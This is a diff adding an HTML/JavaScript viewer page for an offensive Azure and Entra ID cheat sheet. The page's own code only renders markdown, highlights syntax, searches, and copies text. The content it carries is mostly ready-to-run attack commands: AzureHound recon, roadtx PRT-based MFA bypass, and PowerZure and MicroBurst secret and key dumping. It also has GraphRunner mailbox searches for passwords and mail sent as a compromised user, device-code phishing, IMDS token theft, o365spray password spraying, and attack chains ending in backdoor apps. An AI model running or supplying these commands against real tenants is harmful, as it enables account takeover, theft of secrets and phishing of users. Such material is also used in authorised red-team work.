+# Interactive login
+./azurehound -u "user@company.com" -p "Password" list --tenant "TENANT-ID" -o output.json
+
+# All accessible tenants
+./azurehound -u "user@company.com" -p "Password" list --tenant "all" -o output.json
+
+# With client secret
+./azurehound --app "APP-ID" --secret "SECRET" --tenant "TENANT-ID" list -o output.json
+
+# With refresh token
+./azurehound --refresh-token "TOKEN" --tenant "TENANT-ID" list -o output.json
+
+# Specific object types
+./azurehound --tenant "TENANT-ID" list azure-users -o users.json
+./azurehound --tenant "TENANT-ID" list azure-groups -o groups.json
+./azurehound --tenant "TENANT-ID" list azure-roles -o roles.json
+./azurehound --tenant "TENANT-ID" list azure-apps -o apps.json
+./azurehound --tenant "TENANT-ID" list azure-devices -o devices.json
+./azurehound --tenant "TENANT-ID" list azure-service-principals -o sps.json
+./azurehound --tenant "TENANT-ID" list azure-subscriptions -o subs.json
+./azurehound --tenant "TENANT-ID" list azure-vms -o vms.json
+./azurehound --tenant "TENANT-ID" list azure-key-vaults -o kv.json
+\`\`\`
+
+### Import to BloodHound
+\`\`\`bash
+# Start BloodHound CE (Docker)
+git clone https://github.com/SpecterOps/BloodHound
+cd BloodHound
+cp examples/docker-compose/docker-compose.yml .
+docker compose up
+
+# Import via API
+curl -X POST http://localhost:8080/api/v2/file-upload/start \\
+  -H "Authorization: Bearer TOKEN" \\
+  -F "file=@output.json"
+\`\`\`
+
+### Key Cypher Queries (Azure)
+\`\`\`cypher
+-- All Global Admins
+MATCH p=(n:AZUser)-[:AZHasRole]->(r:AZRole)
+WHERE r.displayname = "Global Administrator" RETURN p
+
+-- Paths from owned user to Global Admin
+MATCH p=shortestPath((n:AZUser {email:"owned@company.com"})-[*1..]->(t:AZRole {displayname:"Global Administrator"}))
+RETURN p
+
+-- Service Principals with dangerous permissions
+MATCH p=(n:AZServicePrincipal)-[:AZHasRole|AZOwns|AZRunsAs*1..3]->(t)
+RETURN p LIMIT 50
+
+-- All objects with Owner rights
+MATCH p=(n)-[:AZOwns]->(t) RETURN p LIMIT 50
+
+-- Key vault access paths
+MATCH p=(n)-[*1..5]->(t:AZKeyVault) RETURN p LIMIT 100
+
+-- Managed identities and their resource access
+MATCH p=(n:AZManagedIdentity)-[*1..3]->(t) RETURN p
+\`\`\`
+
+---
+
+## ROADtools / ROADrecon
+
+### Installation
+\`\`\`bash
+pip install roadtools roadrecon
+# Optional: roadtx (token exchanger)
+pip install roadtx
+\`\`\`
+
+### roadrecon
+\`\`\`bash
+# Authenticate
+roadrecon auth -u "user@company.com" -p "Password"
+roadrecon auth --device-code --tenant "TENANT-ID"
+roadrecon auth --client-id "APP-ID" --client-secret "SECRET" --tenant "TENANT-ID"
+
+# Gather all data (stores in SQLite: roadrecon.db)
+roadrecon gather
+
+# Selectively skip slow collections
+roadrecon gather --skip-users
+roadrecon gather --skip-serviceprincipals
+
+# Start web GUI
+roadrecon gui
+# → http://127.0.0.1:5000
+\`\`\`
+
+### roadtx — Token Exchange
+\`\`\`bash
+# Authenticate
+roadtx auth -u "user@company.com" -p "Password"
+roadtx auth --device-code
+
+# Get token for specific resource
+roadtx auth -u "user@company.com" -p "Password" -r "https://management.azure.com/"
+
+# PRT-based auth (MFA bypass)
+roadtx prtauth --prt "PRT-VALUE" --prt-sessionkey "SESSION-KEY"
+
+# MFA bypass via PRT nonce
+roadtx prtauth --prt "PRT-VALUE" --prt-sessionkey "SESSION-KEY" --use-prt-nonce
+
+# Refresh token to different resource
+roadtx refreshtokenflow --refresh-token "TOKEN" -r "https://management.azure.com/"
+\`\`\`
+
+### Query DB
+\`\`\`bash
+sqlite3 roadrecon.db
+
+# All tables
+.tables
+
+# High-privilege users
+SELECT displayName, userPrincipalName FROM Users WHERE accountEnabled = 1;
+
+# Apps with secrets
+SELECT displayName, appId FROM Applications WHERE passwordCredentials != '[]';
+
+# Directory role members
+SELECT Users.displayName, Users.userPrincipalName, DirectoryRoles.displayName AS role
+FROM DirectoryRoleMembers
+JOIN Users ON DirectoryRoleMembers.member = Users.objectId
+JOIN DirectoryRoles ON DirectoryRoleMembers.role = DirectoryRoles.objectId;
+\`\`\`
+
+---
+
+## PowerZure
+
+\`\`\`powershell
+git clone https://github.com/hausec/PowerZure
+Import-Module .\\PowerZure.psd1
+
+# Recon
+Get-AzureTenant
+Get-AzureTarget                        # subscriptions/RGs
+Get-AzureUser
+Get-AzureGroup
+Get-AzureGroupMember -Group "GROUP-NAME"
+Get-AzureApp
+Get-AzureServicePrincipal
+Get-AzureDevice
+Get-AzureRoleAssignment
+
+# Current user's roles
+Get-AzureCurrentUserRole
+
+# VMs
+Get-AzureVM
+Get-AzureVMPublicIP
+
+# Code execution on VMs
+Invoke-AzureRunCommand -VM "VM-NAME" -ResourceGroup "RG" -Command "whoami"
+
+# Function App env vars (secrets!)
+Get-AzureFunctionAppContent -FunctionApp "FUNC-NAME" -ResourceGroup "RG"
+
+# Storage
+Get-AzureStorageAccount
+Get-AzureStorageAccountKey -StorageAccount "SA-NAME" -ResourceGroup "RG"
+Get-AzureStorageContents -StorageAccount "SA-NAME" -ResourceGroup "RG"
+
+# Key Vault
+Get-AzureKeyVaultContent -VaultName "VAULT-NAME"
+Get-AzureKeyVaultSecret -VaultName "VAULT-NAME" -SecretName "SECRET"
+
+# Automation Accounts
+Get-AzureAutomationAccount
+Get-AzureAutomationCredential
+Invoke-AzureRunbook -AutomationAccount "ACCOUNT" -ResourceGroup "RG" -Script "whoami"
+
+# App secrets
+Get-AzureAppSecrets
+Get-AzureServicePrincipalSecret
+
+# Networking
+Get-AzureNSGRules
+Get-AzurePublicIP
+\`\`\`
+
+---
+
+## MicroBurst
+
+\`\`\`powershell
+git clone https://github.com/NetSPI/MicroBurst
+Import-Module .\\MicroBurst.psm1
+
+# Unauthenticated — brute-force storage accounts
+Invoke-EnumerateAzureBlobs -Base "companyname"
+Invoke-EnumerateAzureBlobs -Base "companyname" -OutputFile blobs.txt
+
+# Enumerate subdomains
+Invoke-EnumerateAzureSubDomains -Base "companyname"
+# Checks: .blob/.file/.queue/.table.core.windows.net, .azurewebsites.net,
+#         .vault.azure.net, .azuredatalakestore.net, .search.windows.net, etc.
+
+# Authenticated — full recon
+Invoke-AzureRecon -Verbose -Output ./recon_output
+
+# Dump all storage account keys, app configs, automation, KV
+Get-AzurePasswords -Verbose
+
+# Runbooks (check for embedded creds)
+Get-AzureRunbooks -ResourceGroup "RG" -AutomationAccount "AA"
+
+# App service env vars
+Get-AzureAppServices -Verbose
+Get-AzureAppServiceConfig -AppServiceName "APP-NAME" -ResourceGroup "RG"
+
+# Deployment history (ARM templates may contain plaintext creds!)
+Get-AzureDeploymentSecrets -Subscription "SUB-ID"
+
+# External recon
+Get-MSCloudDomainRecon -Domain "company.com"
+\`\`\`
+
+---
+
+## GraphRunner
+
+\`\`\`powershell
+git clone https://github.com/dafthack/GraphRunner
+Import-Module .\\GraphRunner.ps1
+
+# Get tokens
+Get-GraphTokens
+Get-GraphTokens -UserPasswordAuth
+
+# Refresh to other resources
+Invoke-RefreshToMSGraphToken -RefreshToken "TOKEN" -Domain "company.com"
+Invoke-RefreshToSharePointToken -RefreshToken "TOKEN" -Domain "company.com"
+Invoke-RefreshToOutlookToken -RefreshToken "TOKEN" -Domain "company.com"
+Invoke-RefreshToTeamsToken -RefreshToken "TOKEN" -Domain "company.com"
+
+# Full tenant recon
+Invoke-GraphRecon -Tokens $tokens -PermissionEnum
+
+# Dump CA policies
+Invoke-DumpCAPS -Tokens $tokens
+
+# Dump apps
+Invoke-DumpApps -Tokens $tokens
+
+# Search emails (VERY powerful if you have Mail.Read)
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 50
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "VPN" -AllMessages
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -Download  # download attachments
+
+# Search OneDrive/SharePoint
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "secret" -Download
+
+# Teams messages
+Invoke-SearchTeams -Tokens $tokens -SearchTerm "password"
+
+# Enumerate groups
+Invoke-DumpGroups -Tokens $tokens
+
+# Send email as compromised user
+Send-GraphMail -Tokens $tokens -To "target@external.com" -Subject "Follow Up" -Body "Please click here"
+\`\`\`
+
+---
+
+## TokenTacticsV2
+
+\`\`\`powershell
+git clone https://github.com/f-bader/TokenTacticsV2
+Import-Module .\\TokenTactics.psd1
+
+# Get tokens via device code (phishing)
+Get-AzureTokens -Client "MSTeams" -UseCAE
+
+# Available clients
+# MSTeams, MSOffice, AzurePowerShell, MSEdge, Outlook, OneDrive, SharePoint, AzureCLI
+
+# Refresh to different resources
+Invoke-RefreshToMSGraphToken -refreshToken $response.refresh_token -domain "company.com"
+Invoke-RefreshToAzureManagementToken -refreshToken $response.refresh_token -domain "company.com"
+Invoke-RefreshToSharePointToken -refreshToken $response.refresh_token -Domain "company.com" -SharePointTenantName "company"
+Invoke-RefreshToOutlookToken -refreshToken $response.refresh_token -Domain "company.com"
+Invoke-RefreshToTeamsToken -refreshToken $response.refresh_token -Domain "company.com"
+Invoke-RefreshToOneDriveToken -refreshToken $response.refresh_token -Domain "company.com"
+
+# CAE tokens — last up to 28 hours
+Get-AzureTokens -Client "MSTeams" -UseCAE
+
+# Decode token
+Parse-JWTToken -Token $token.access_token
+\`\`\`
+
+---
+
+## Manual Token Abuse
+
+### Device Code Flow (Manual)
+\`\`\`bash
+CLIENT_ID="d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office
+TENANT_ID="your-tenant-id"
+
+# Step 1: Request device code
+curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/devicecode" \\
+  -d "client_id=$CLIENT_ID&scope=https://graph.microsoft.com/.default offline_access"
+
+# Step 2: Send victim to https://microsoft.com/devicelogin with the code
+
+# Step 3: Poll for token
+curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \\
+  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=$CLIENT_ID&device_code=DEVICE_CODE"
+\`\`\`
+
+### Token to Graph API
+\`\`\`bash
+TOKEN="eyJ0eXAi..."
+
+# Me
+curl -s -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me
+
+# All users
+curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users?\\$top=999"
+
+# Send email
+curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\
+  https://graph.microsoft.com/v1.0/me/sendMail \\
+  -d '{"message":{"subject":"Test","body":{"contentType":"Text","content":"Hello"},"toRecipients":[{"emailAddress":{"address":"target@victim.com"}}]}}'
+\`\`\`
+
+### IMDS Token (from compromised VM)
+\`\`\`bash
+# System-assigned MI
+curl -s -H "Metadata: true" \\
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Extract token and use it
+TOKEN=$(curl -s -H "Metadata: true" \\
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+curl -s -H "Authorization: Bearer $TOKEN" \\
+  "https://management.azure.com/subscriptions?api-version=2020-01-01"
+
+# Get VM metadata
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+\`\`\`
+
+---
+
+## o365spray — User Enumeration & Password Spray
+
+\`\`\`bash
+pip install o365spray
+
+# User enumeration
+python3 o365spray.py --enum -U users.txt --domain "company.com"
+python3 o365spray.py --enum -U users.txt --domain "company.com" --enum-type ActiveSync
+# Methods: office, activesync, autodiscover, rst2, owa, oauth2
+
+# Password spray
+python3 o365spray.py --spray -U valid_users.txt -P passwords.txt --domain "company.com" --sleep 30 --jitter 15
+
+# Single password
+python3 o365spray.py --spray -U valid_users.txt -p "Spring2024!" --domain "company.com"
+
+# Lockout-aware (1 attempt per 30 min)
+python3 o365spray.py --spray -U users.txt -P pass.txt --domain "company.com" --lockout 1 --sleep 1800
+\`\`\`
+
+---
+
+## Practical Attack Chains
+
+### Chain 1: External → Spray → Token Abuse
+\`\`\`
+1. Recon:    Invoke-AADIntReconAsOutsider -DomainName "company.com"
+2. Subdomains: Invoke-EnumerateAzureSubDomains -Base "company"
+3. Users:    Invoke-AADIntUserEnumerationAsOutsider / o365spray --enum
+4. Spray:    o365spray --spray (1 pass / 30 min)
+5. Tokens:   Get-AADIntAccessTokenForMSGraph -SaveToCache
+6. Recon:    Invoke-AADIntReconAsInsider / Invoke-GraphRecon / roadrecon gather
+7. BH:       AzureHound collect → BloodHound analysis
+8. Paths:    GenericAll / Owner / AZAddMembers / AZAppAdmin paths
+\`\`\`
+
+### Chain 2: Compromised VM → Privilege Escalation
+\`\`\`
+1. IMDS:     curl IMDS for MI token
+2. Roles:    az role assignment list --assignee MI-CLIENT-ID --all
+3. KV:       az keyvault secret list/show (if Key Vault access)
+4. Env Vars: az functionapp/webapp config appsettings list
+5. Laterals: Use new creds → repeat
+\`\`\`
+
+### Chain 3: App Registration Abuse
+\`\`\`
+1. Find:     Get-MgApplication -All | Where PasswordCredentials -ne @()
+2. Owners:   Get-MgApplicationOwner -ApplicationId APP-ID
+3. If own:   Add-MgApplicationPassword → get new client secret
+4. Token:    Get-AADIntAccessTokenForMSGraph -ClientId -ClientSecret
+5. Roles:    Check SP directory roles / RBAC assignments
+\`\`\`
+
+### Chain 4: Device Code Phishing
+\`\`\`
+1. Phish:    Invoke-AADIntDeviceCodeFlow / TokenTacticsV2 Get-AzureTokens
+2. Lure:     Social engineer victim to enter code at microsoft.com/devicelogin
+3. Token:    Receive access + refresh tokens
+4. Refresh:  Convert to other resources (Graph, Management, Exchange, Teams)
+5. Persist:  Add backdoor app / add owner to existing app / create admin user
+\`\`\``;
+
+// ── Markdown Parser ───────────────────────────────────────────────────────────
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function syntaxHighlight(code, lang) {
+  // Use NUL-byte placeholders so regex passes don't corrupt each other's span tags.
+  // Order: protect strings → protect comments → apply everything else → flush placeholders.
+  const P = '\x00'; // placeholder delimiter (never appears in code)
+  const slots = [];
+  function protect(html) { slots.push(html); return P + (slots.length - 1) + P; }
+  function flush(s) { return s.replace(/\x00(\d+)\x00/g, (_, i) => slots[+i]); }
+
+  let s = escapeHtml(code);
+
+  if (lang === 'powershell' || lang === 'ps1') {
+    // 1. Strings (highest priority — protect before anything else touches them)
+    s = s.replace(/(["'])([^"'\n]*)\1/g, m => protect(`<span class="str">${m}</span>`));
+    // 2. Comments (rest of line after #, only when not inside a string placeholder)
+    s = s.split('\n').map(line => {
+      const ci = line.indexOf('#');
+      if (ci === -1) return line;
+      // make sure # isn't inside a protected slot
+      const before = line.slice(0, ci);
+      if ((before.match(/\x00/g) || []).length % 2 !== 0) return line; // inside slot
+      return before + protect(`<span class="cm">${line.slice(ci)}</span>`);
+    }).join('\n');
+    // 3. Cmdlet functions (Get-Foo style)
+    s = s.replace(/\b((?:Get|Set|New|Remove|Add|Update|Invoke|Connect|Disconnect|Export|Import|Install|Uninstall|Enable|Disable|Read|Write|Restore|ConvertTo|ConvertFrom|Out|ForEach|Sort|Group|Measure|Format|Test|Copy|Move|Send|Receive|Start|Stop|Restart|Publish|Register|Unregister|Clear|Rename|Wait|Watch|Show|Hide|Open|Close|Join|Split)-[\w-]+)/g,
+      m => protect(`<span class="fn">${m}</span>`));
+    // 4. Variables
+    s = s.replace(/(\$[\w]+)/g, m => protect(`<span class="var">${m}</span>`));
+    // 5. Flags
+    s = s.replace(/([ \t])(-[A-Za-z][\w]*)/g, (_, sp, flag) => sp + protect(`<span class="flag">${flag}</span>`));
+    // 6. Keywords
+    s = s.replace(/\b(if|else|elseif|foreach|for|while|do|switch|try|catch|finally|return|break|continue|function|param|begin|process|end)\b/gi,
+      m => protect(`<span class="kw">${m}</span>`));
+
+  } else if (lang === 'bash' || lang === 'sh') {
+    s = s.replace(/(["'])([^"'\n]*)\1/g, m => protect(`<span class="str">${m}</span>`));
+    s = s.split('\n').map(line => {
+      const ci = line.indexOf('#');
+      if (ci === -1) return line;
+      const before = line.slice(0, ci);
+      if ((before.match(/\x00/g) || []).length % 2 !== 0) return line;
+      return before + protect(`<span class="cm">${line.slice(ci)}</span>`);
+    }).join('\n');
+    s = s.replace(/\b(az|curl|python3|pip3?|git|docker|sqlite3|wget|unzip|roadrecon|roadtx|o365spray)\b/g,
+      m => protect(`<span class="fn">${m}</span>`));
+    s = s.replace(/(\$[\w{]+}?)/g, m => protect(`<span class="var">${m}</span>`));
+    s = s.replace(/([ \t])(--[\w-]+=?|-[a-zA-Z]\b)/g, (_, sp, flag) => sp + protect(`<span class="flag">${flag}</span>`));
+    s = s.replace(/\b(if|then|else|elif|fi|for|while|do|done|case|esac|in|function|return|export|local|source|echo|printf|exit|break|continue)\b/g,
+      m => protect(`<span class="kw">${m}</span>`));
+
+  } else if (lang === 'cypher') {
+    s = s.replace(/(["'])([^"'\n]*)\1/g, m => protect(`<span class="str">${m}</span>`));
+    s = s.replace(/(--[^\n]*)/g, m => protect(`<span class="cm">${m}</span>`));
+    s = s.replace(/\b(MATCH|WHERE|RETURN|WITH|AS|LIMIT|ORDER|BY|CREATE|MERGE|SET|DELETE|DETACH|OPTIONAL|UNION|CALL|YIELD)\b/g,
+      m => protect(`<span class="kw">${m}</span>`));
+  }
+
+  return flush(s);
+}
+
+function parseMarkdown(md, tabPrefix) {
+  const lines = md.split('\n');
+  let html = '';
+  let inCode = false, codeLang = '', codeLines = [];
+  let inTable = false, tableLines = [];
+
+  function flushTable() {
+    if (!tableLines.length) return;
+    let t = '<table>';
+    tableLines.forEach((row, i) => {
+      const cells = row.split('|').filter((c,ci,a) => ci>0 && ci<a.length-1).map(c => c.trim());
+      if (i === 1) { tableLines.splice(1,1); return; } // skip separator
+      const tag = i === 0 ? 'th' : 'td';
+      t += '<tr>' + cells.map(c => `<${tag}>${inlineFormat(c)}</${tag}>`).join('') + '</tr>';
+    });
+    t += '</table>';
+    html += t;
+    tableLines = [];
+    inTable = false;
+  }
+
+  function inlineFormat(s) {
+    return s
+      .replace(/`([^`]+)`/g, '<code>$1</code>')
+      .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+      .replace(/\*([^*]+)\*/g, '<em>$1</em>');
+  }
+
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+
+    if (line.startsWith('```')) {
+      if (!inCode) {
+        inCode = true;
+        codeLang = line.slice(3).trim().toLowerCase();
+        codeLines = [];
+        if (inTable) flushTable();
+      } else {
+        const highlighted = syntaxHighlight(codeLines.join('\n'), codeLang);
+        html += `<pre><span class="lang-label">${codeLang||'code'}</span><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>${highlighted}</code></pre>`;
+        inCode = false;
+        codeLang = '';
+        codeLines = [];
+      }
+      continue;
+    }
+    if (inCode) { codeLines.push(line); continue; }
+
+    // Table
+    if (line.startsWith('|')) {
+      inTable = true;
+      tableLines.push(line);
+      continue;
+    } else if (inTable) {
+      flushTable();
+    }
+
+    if (line.startsWith('# ')) {
+      html += `<h1>${inlineFormat(escapeHtml(line.slice(2)))}</h1>`;
+    } else if (line.startsWith('## ')) {
+      const id = tabPrefix + '-' + line.slice(3).toLowerCase().replace(/[^a-z0-9]+/g,'-');
+      html += `<h2 id="${id}">${inlineFormat(escapeHtml(line.slice(3)))}</h2>`;
+    } else if (line.startsWith('### ')) {
+      const id = tabPrefix + '-' + line.slice(4).toLowerCase().replace(/[^a-z0-9]+/g,'-');
+      html += `<h3 id="${id}">${inlineFormat(escapeHtml(line.slice(4)))}</h3>`;
+    } else if (line.startsWith('---')) {
+      html += '<hr>';
+    } else if (line.match(/^[*-] /)) {
+      html += `<ul><li>${inlineFormat(escapeHtml(line.slice(2)))}</li></ul>`;
+    } else if (line.trim() === '') {
+      // skip
+    } else {
+      html += `<p>${inlineFormat(escapeHtml(line))}</p>`;
+    }
+  }
+  if (inTable) flushTable();
+  return html;
+}
+
+// ── Init ─────────────────────────────────────────────────────────────────────
+
+const TABS = ['mgraph','azcli','aadinternals','misc'];
+const RENDERED = {};
+
+function render() {
+  TABS.forEach(tab => {
+    const el = document.getElementById('panel-' + tab);
+    RENDERED[tab] = parseMarkdown(CONTENT[tab], tab);
+    el.innerHTML = RENDERED[tab];
+  });
+}
+
+function buildSectionNav(tab) {
+  const panel = document.getElementById('panel-' + tab);
+  const headings = panel.querySelectorAll('h2, h3');
+  let nav = '';
+  headings.forEach(h => {
+    const indent = h.tagName === 'H3' ? 'padding-left:36px' : '';
+    nav += `<button class="sec-btn" style="${indent}" onclick="scrollToSection('${h.id}')">${h.textContent}</button>`;
+  });
+  document.getElementById('section-nav').innerHTML = nav
+    ? `<div class="sidebar-label" style="margin-top:8px">Sections</div><div class="section-list">${nav}</div>`
+    : '';
+}
+
+function scrollToSection(id) {
+  const el = document.getElementById(id);
+  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+let activeTab = 'mgraph';
+function switchTab(tab) {
+  TABS.forEach(t => {
+    document.getElementById('panel-' + t).classList.toggle('active', t === tab);
+    document.getElementById('btn-' + t).classList.toggle('active', t === tab);
+  });
+  activeTab = tab;
+  buildSectionNav(tab);
+  document.getElementById('search').dispatchEvent(new Event('input'));
+  document.getElementById('main-content').scrollTop = 0;
+}
+
+function copyCode(btn) {
+  const code = btn.nextElementSibling.textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+// ── Search ───────────────────────────────────────────────────────────────────
+
+let searchTimeout;
+document.getElementById('search').addEventListener('input', function() {
+  clearTimeout(searchTimeout);
+  searchTimeout = setTimeout(() => doSearch(this.value.trim()), 150);
+});
+
+function doSearch(q) {
+  const panel = document.getElementById('panel-' + activeTab);
+  const countEl = document.getElementById('search-count');
+
+  if (!q) {
+    panel.innerHTML = RENDERED[activeTab];
+    countEl.textContent = '';
+    reattachCopyButtons();
+    return;
+  }
+
+  const escaped = q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+  const re = new RegExp(`(${escaped})`, 'gi');
+
+  // Count matches in raw text
+  const matches = (CONTENT[activeTab].match(re) || []).length;
+  countEl.textContent = matches ? `${matches} matches` : 'No matches';
+
+  // Highlight in rendered HTML (text nodes only)
+  const tmp = document.createElement('div');
+  tmp.innerHTML = RENDERED[activeTab];
+  highlightTextNodes(tmp, re);
+  panel.innerHTML = tmp.innerHTML;
+  reattachCopyButtons();
+
+  // Scroll to first match
+  const first = panel.querySelector('mark');
+  if (first) first.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+
+function highlightTextNodes(node, re) {
+  if (node.nodeType === 3) {
+    if (re.test(node.textContent)) {
+      const span = document.createElement('span');
+      span.innerHTML = node.textContent.replace(re, '<mark>$1</mark>');
+      node.parentNode.replaceChild(span, node);
+      return;
+    }
+  } else if (node.tagName !== 'SCRIPT' && node.tagName !== 'STYLE') {
+    Array.from(node.childNodes).forEach(child => highlightTextNodes(child, re));
+  }
+}
+
+function reattachCopyButtons() {
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.onclick = function() { copyCode(this); };
+  });
+}
+
+// ── Download ─────────────────────────────────────────────────────────────────
+
+const TAB_NAMES = {
+  mgraph: 'mgraph_cheatsheet.md',
+  azcli: 'azcli_cheatsheet.md',
+  aadinternals: 'aadinternals_cheatsheet.md',
+  misc: 'azure_misc_tools_cheatsheet.md'
+};
+
+function downloadCurrent() {
+  const content = CONTENT[activeTab];
+  const filename = TAB_NAMES[activeTab];
+  const blob = new Blob([content], { type: 'text/markdown;charset=utf-8' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  const btn = document.getElementById('dl-btn');
+  btn.textContent = '✓ Saved';
+  setTimeout(() => { btn.textContent = '⬇ Download'; }, 1500);
+}
+
+// ── Start ────────────────────────────────────────────────────────────────────
+
+render();
+buildSectionNav('mgraph');
+reattachCopyButtons();
+</script>
+</body>
+</html>
